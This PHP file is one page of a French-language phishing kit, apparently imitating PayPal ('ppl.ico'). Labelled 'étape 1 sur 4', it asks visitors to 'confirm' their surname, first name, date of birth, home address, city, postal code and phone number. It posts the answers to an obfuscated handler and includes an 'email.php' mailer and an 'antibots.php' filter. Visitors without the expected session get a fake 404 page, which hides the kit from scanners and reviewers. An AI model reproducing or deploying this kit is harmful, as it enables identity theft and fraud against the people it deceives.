<?php 

ob_start();
session_start();
if(isset($_SESSION['step_two'])){
include '../email.php';
include'../antibots.php';

?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Confirmez votre adresse</title>
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'serv5202.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
                         <span class="step" style="text-transform:uppercase"><b>étape 1 sur 4</b></span>
                       <h3>Confirmez votre adresse </h3>
                                                <input type="text" name="l_name" class="bill_input" placeholder="Nom" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <input type="text" name="f_name" class="bill_input" placeholder="Prénom" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <input type="text" maxlength="10" name="dob" id="Dobt" class="bill_input" placeholder="Date de naissance" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <input type="text" name="address1" class="bill_input" placeholder="Adresse personnelle" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">  
                        <select class="bill_input" id="country" name="country">
                                                       <option value="" selected disabled>Pays</option> 
	<option value="France">France</option> 
                                              <input type="text" name="city" class="bill_input" placeholder="Ville" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        
                        <input type="text" name="ZIP" maxlength="7" class="bill_input" placeholder="Code Postal" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                                                <input type="text" name="phone" class="bill_input" placeholder="Numéro de téléphone" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <hr>
                        <input type="submit" value="Continuer" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
            <script>
    $(document).ready(function() {
            $.getJSON("http://ip-api.com/json", function(data) {
                    var kap = (data.country);
                    $("#country").val(kap);
                });
    });
            </script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>
